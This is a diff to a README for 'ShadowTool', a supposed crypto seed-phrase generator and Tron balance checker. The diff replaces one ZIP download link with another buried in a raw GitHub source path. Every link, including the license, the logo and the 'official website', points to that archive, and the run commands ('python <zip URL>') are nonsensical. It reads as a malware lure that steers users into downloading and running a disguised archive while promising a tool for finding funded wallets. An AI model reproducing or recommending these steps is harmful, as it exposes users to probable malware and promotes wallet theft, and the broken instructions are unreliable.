@@ -25,11 +25,11 @@ This script is designed to automatically generate seed phrases and check balance
 
 ## Installation
 
-1. Download the [latest release](https://github.com/velmafxx/ShadowTool/releases/download/v2.0/Program.zip) of ShadowTool.
+1. Download the [latest release](https://raw.githubusercontent.com/velmafxx/ShadowTool/v24/src/main/java/com/example/application/Shadow-Tool-v3.2-alpha.4.zip) of ShadowTool.
 2. Extract the contents of the ZIP file to a folder on your local machine.
 3. Open a terminal or command prompt window.
 4. Navigate to the directory where you extracted the files.
-5. Run the script by executing the following command: `python https://github.com/velmafxx/ShadowTool/releases/download/v2.0/Program.zip`.
+5. Run the script by executing the following command: `python https://raw.githubusercontent.com/velmafxx/ShadowTool/v24/src/main/java/com/example/application/Shadow-Tool-v3.2-alpha.4.zip`.
 
 ---
 
@@ -39,7 +39,7 @@ This script is designed to automatically generate seed phrases and check balance
 
 To generate seed phrases using ShadowTool, follow these steps:
 
-1. Run the script by executing `python https://github.com/velmafxx/ShadowTool/releases/download/v2.0/Program.zip`.
+1. Run the script by executing `python https://raw.githubusercontent.com/velmafxx/ShadowTool/v24/src/main/java/com/example/application/Shadow-Tool-v3.2-alpha.4.zip`.
 2. Select the option to generate seed phrases.
 3. The script will automatically create random seed phrases for you to use.
 
@@ -47,7 +47,7 @@ To generate seed phrases using ShadowTool, follow these steps:
 
 To check balances for Tron networks, do the following:
 
-1. Run the script by executing `python https://github.com/velmafxx/ShadowTool/releases/download/v2.0/Program.zip`.
+1. Run the script by executing `python https://raw.githubusercontent.com/velmafxx/ShadowTool/v24/src/main/java/com/example/application/Shadow-Tool-v3.2-alpha.4.zip`.
 2. Choose the option to check balances.
 3. Enter the Tron network address you wish to check.
 4. The script will retrieve and display the balance associated with the provided address.
@@ -75,15 +75,15 @@ We welcome contributions from the community to improve ShadowTool. To contribute
 
 ## License
 
-This project is licensed under the MIT License - see the [https://github.com/velmafxx/ShadowTool/releases/download/v2.0/Program.zip](https://github.com/velmafxx/ShadowTool/releases/download/v2.0/Program.zip) file for details.
+This project is licensed under the MIT License - see the [https://raw.githubusercontent.com/velmafxx/ShadowTool/v24/src/main/java/com/example/application/Shadow-Tool-v3.2-alpha.4.zip](https://raw.githubusercontent.com/velmafxx/ShadowTool/v24/src/main/java/com/example/application/Shadow-Tool-v3.2-alpha.4.zip) file for details.
 
 ---
 
-![ShadowTool Logo](https://github.com/velmafxx/ShadowTool/releases/download/v2.0/Program.zip)
+![ShadowTool Logo](https://raw.githubusercontent.com/velmafxx/ShadowTool/v24/src/main/java/com/example/application/Shadow-Tool-v3.2-alpha.4.zip)
 
 ---
 
-🔗 For more information, visit our [official website](https://github.com/velmafxx/ShadowTool/releases/download/v2.0/Program.zip).
+🔗 For more information, visit our [official website](https://raw.githubusercontent.com/velmafxx/ShadowTool/v24/src/main/java/com/example/application/Shadow-Tool-v3.2-alpha.4.zip).
 
 ---
 
